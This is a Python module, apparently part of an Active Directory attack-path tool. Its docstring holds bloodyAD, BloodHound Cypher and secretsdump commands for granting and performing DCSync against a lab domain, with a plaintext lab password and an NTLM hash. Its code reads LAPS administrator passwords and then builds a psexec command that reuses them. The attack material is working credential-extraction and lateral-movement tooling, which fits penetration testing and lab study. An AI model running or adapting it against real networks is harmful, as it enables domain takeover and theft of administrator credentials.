# strategies/techniques/credential_techniques.py

"""
│   ├── credential_techniques.py ← hash/password extraction
│   │   ├── _do_dcsync
│   │   └── _do_read_laps

    bloodyAD --host <dc_ip> -d <domain> -u <user> -p <password> add dcsync <target_sam>
    Yes! GetChanges + GetChangesAll together are DCSync — BloodHound just represents them as separate edges.
    MATCH p=(:Base)-[:DCSync|GetChanges|GetChangesAll]->(:Domain)
    RETURN p
    LIMIT 1000
vagrant (User) 
  → MemberOf → Administrators (Group)
  → GetChanges + GetChangesAll → Domain
  ∴ vagrant can DCSync
    Or find who can GRANT DCSync (has WriteDacl on Domain)
cypher

MATCH p=(:Base)-[:WriteDacl]->(:Domain)
RETURN p
LIMIT 25
cypher

MATCH p=(:Base)-[:GenericAll]->(:Domain)
RETURN p
LIMIT 25
These principals can call _do_grant_dcsync to give themselves GetChanges + GetChangesAll.
# Linux/WSL
secretsdump.py -just-dc sevenkingdoms.local/vagrant:vagrant@192.168.56.10

# or with hash
secretsdump.py -just-dc -hashes :9029cf007326107eb1c519c84ea60dbe sevenkingdoms.local/vagrant@192.168.56.10
    """

from services.printing import print_done
from entities.exploit_result import ExploitResult
from entities.credentials import Credential
from exceptions.hop_failed_error import HopFailedError


class CredentialTechniquesMixin:
    def _do_read_laps(self, creds: dict) -> ExploitResult:
        computer_fqdn  = self.target.label
        computer_short = computer_fqdn.split(".")[0]

        laps_password = None

        # Tente d'abord le FQDN, puis le nom court en fallback
        for computer in [computer_fqdn, computer_short]:
            try: 
                output = self._run_bloodyad(
                    creds,
                    ["get", "object", computer, "--attr", "ms-Mcs-AdmPwd"],
                    "ReadLAPSPassword",
                )
            except HopFailedError:
                continue  # try short name if FQDN failed

            for line in output.splitlines():
                if "ms-Mcs-AdmPwd" in line and ":" in line:
                    laps_password = line.split(":", 1)[1].strip()
                    break

            if laps_password:
                break  # succès, inutile d'essayer le nom court

        if not laps_password:
            raise HopFailedError(
                self.edge,
                f"ms-Mcs-AdmPwd not found — LAPS may not be configured on this machine"
            )

        print_done(f"LAPS password retrieved for Administrator on {computer_fqdn}")

        return ExploitResult(
            technique="ReadLAPSPassword",
            edge=self.edge,
            success=True,
            notes=(
                f"LAPS read on {computer_fqdn} by {self.attacker.label}\n"
                f"Username : Administrator\n"
                f"Password : {laps_password}\n"
                f"Domain   : {creds['domain']}"
            ),
            next_command=(
                f"impacket-psexec {creds['domain']}/Administrator:'{laps_password}'"
                f"@{computer_fqdn} -target-ip {creds['dc_ip']}"
            ),
            cleanup_command=(
                "# LAPS renouvellera le mot de passe automatiquement à la prochaine échéance"
            ),
            gained_access=Credential(
                username="Administrator",
                password=laps_password,
                domain=creds.get("domain"),
                dc_ip=creds.get("dc_ip"),
            ),
        )